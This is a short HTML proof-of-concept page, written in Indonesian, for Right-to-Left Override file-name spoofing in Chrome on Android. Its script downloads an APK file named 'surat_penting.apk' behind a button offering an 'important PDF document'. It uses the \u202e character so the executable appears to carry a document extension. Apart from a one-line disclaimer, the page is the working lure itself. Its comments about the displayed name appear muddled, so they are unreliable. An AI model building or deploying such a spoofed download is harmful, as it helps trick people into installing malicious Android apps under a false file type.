<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC RTLO Spoofing Chrome Android</title>
    <style>
        body { font-family: sans-serif; padding: 30px; text-align: center; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        .warning { color: red; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>

    <h1>PoC Keamanan Chrome Android</h1>
    <p class="warning">Gunakan hanya untuk keperluan pengujian dan edukasi keamanan.</p>

    <h2>Skenario 1: RTLO File Name Spoofing</h2>
    <p>Unduh dokumen PDF penting di bawah ini:</p>
    
    <button onclick="unduhDokumen()">Unduh Dokumen PDF</button>

    <script>
        function unduhDokumen() {
            const link = document.createElement('a');
            
            // Nama file asli: surat_penting.apk
            const namaFileAsli = "surat_penting.apk";
            
            // Karakter \u202e adalah Right-to-Left Override (RLO)
            // Teks yang mengikuti karakter ini akan dibalik urutannya secara visual.
            // Kita ingin "kpa.fdf" terlihat seperti "fdf.apk" di dialog.
            // Jadi kita balik "fdf.apk" menjadi "kpa.fdf"
            const namaFileTipuan = "surat_penting_\u202ekpa.fdf";
            
            link.href = namaFileAsli; // Link ke file asli
            link.download = namaFileTipuan; // Nama file yang ditampilkan di dialog
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>

</body>
</html>
